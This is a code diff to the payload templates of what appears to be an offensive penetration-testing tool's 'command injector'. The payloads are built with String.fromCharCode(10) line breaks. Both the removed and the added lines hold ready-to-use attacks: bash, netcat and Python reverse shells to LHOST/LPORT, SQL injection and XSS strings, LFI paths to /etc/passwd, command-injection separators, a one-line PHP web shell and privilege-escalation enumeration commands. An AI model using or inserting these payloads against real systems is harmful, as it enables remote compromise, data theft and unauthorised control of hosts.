@@ -2785,21 +2785,14 @@ MASTER_TEMPLATE = """
         // ==================== COMMAND INJECTOR FUNCTIONS ====================
         
         const INJECTION_TEMPLATES = {
-            revshell: "# Bash Reverse Shell\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n# Python Reverse Shell\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Netcat Reverse Shell\nnc LHOST LPORT -e /bin/sh",
-            
-            sqli: "-- SQL Injection Payloads\n' OR '1'='1\n' OR '1'='1' --\n\" OR \"1\"=\"1\n' UNION SELECT NULL--\n' UNION SELECT username,password FROM users--",
-
-            xss: "<!-- XSS Payloads -->\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>",
-
-            lfi: "# LFI Payloads\n../../../etc/passwd\n....//....//....//etc/passwd\n/proc/self/environ\nphp://filter/convert.base64-encode/resource=index.php",
-
-            rce: "# RCE Payloads\n; id\n| id\n$(id)\n; cat /etc/passwd",
-
+            revshell: "# Bash Reverse Shell" + String.fromCharCode(10) + "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" + String.fromCharCode(10) + String.fromCharCode(10) + "# Netcat Reverse Shell" + String.fromCharCode(10) + "nc LHOST LPORT -e /bin/sh",
+            sqli: "-- SQL Injection" + String.fromCharCode(10) + "' OR '1'='1" + String.fromCharCode(10) + "' OR '1'='1' --" + String.fromCharCode(10) + "' UNION SELECT NULL--",
+            xss: "<script>alert('XSS')</script>" + String.fromCharCode(10) + "<img src=x onerror=alert('XSS')>" + String.fromCharCode(10) + "<svg onload=alert('XSS')>",
+            lfi: "../../../etc/passwd" + String.fromCharCode(10) + "/proc/self/environ" + String.fromCharCode(10) + "php://filter/convert.base64-encode/resource=index.php",
+            rce: "; id" + String.fromCharCode(10) + "| id" + String.fromCharCode(10) + "$(id)" + String.fromCharCode(10) + "; cat /etc/passwd",
             webshell: "<?php system($_GET['cmd']); ?>",
-
-            privesc: "# PrivEsc Commands\nwhoami && id\nuname -a\nsudo -l\nfind / -perm -4000 2>/dev/null",
-
-            enumeration: "# Enumeration\nhostname && whoami && id\nuname -a\nip a\nnetstat -tulpn\nps aux"
+            privesc: "whoami && id" + String.fromCharCode(10) + "sudo -l" + String.fromCharCode(10) + "find / -perm -4000 2>/dev/null",
+            enumeration: "hostname && whoami && id" + String.fromCharCode(10) + "uname -a" + String.fromCharCode(10) + "ip a" + String.fromCharCode(10) + "ps aux"
         };
         
         function loadTemplate(type) {
